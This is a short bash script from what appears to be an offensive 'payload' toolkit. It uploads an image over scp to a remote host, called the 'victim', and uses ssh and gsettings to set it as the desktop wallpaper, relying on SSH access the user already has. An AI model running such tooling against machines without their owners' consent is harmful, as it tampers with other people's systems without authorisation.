#!/bin/bash
# Made by Optixal

# Non-Payload.sh module

# PAYLOAD INFO:
# Changes the victim's wallpaper

# VICTIM'S REQUIREMENTS:
# gsettings

# MISC:
# ./transferupload.sh wallpaper.png, ssh, cd /tmp, mv wallpaper.png pwn_wallpaper.png

# CONFIG:
WALLPAPERLOCATION=/tmp/pwn_wallpaper.png

# Colored Status Constants

status="\033[1m\033[94m[*]\033[0m"
good="\033[1m\033[92m[+] SUCCESS:\033[0m"
error="\033[1m\033[91m[-] ERROR:\033[0m"
warning="\033[1m\033[93m[!]\033[0m"
money="\033[1m\033[92m[$] KACHING:\033[0m"

# Check Requirements

if [[ ! -x $(which scp) ]] ||
   [[ ! -x $(which ssh) ]]; then
    echo "$error Both ssh and scp are required!" >&2
    exit 1
fi

if [[ $# -lt 1 ]]
then
	echo -e "$status Usage: $0 [image location]"
	exit 1
fi

IMAGE=$1

if [ -f $IMAGE ]
then
	echo -e "\n$status Loaded $IMAGE"
else
	echo -e "$error Unable to locate $IMAGE. Exiting..."
	exit 1
fi

# Check Optional Requirements

if [ -f ~/.ssh/config ]
then
	echo -e "$status Loaded ssh config file"
else
	echo -e "$warning Unable to locate ssh config file, run addsshconfig.sh."
fi

if ssh-add -l &> /dev/null
then
	echo -e "$status Loaded ssh key in ssh agent"
else
	echo -e "$warning No key loaded into ssh agent, run addsshkey.sh."
fi

# User Input

echo -ne "$status Enter remote user: "
read USER
echo -ne "$status Enter remote IP: "
read IP

# Launch

echo -e "\n$status Attempting to upload wallpaper to remote host..."
if scp $IMAGE $USER@$IP:/tmp/wallpaper 2> /dev/null
then
	echo -e "$good Image upload... Done."
else
	echo -e "$error Failed to upload image. Exiting..."
	exit 1
fi

echo -e "\n$status Attempting to set wallpaper using image..."
if ssh $USER@$IP "gsettings set org.gnome.desktop.background picture-uri file:///tmp/wallpaper" 2> /dev/null
then
	echo -e "$good Set wallpaper... Done.\n"
else
	echo -e "$error Failed to set wallpaper. Exiting..."
	exit 1
fi

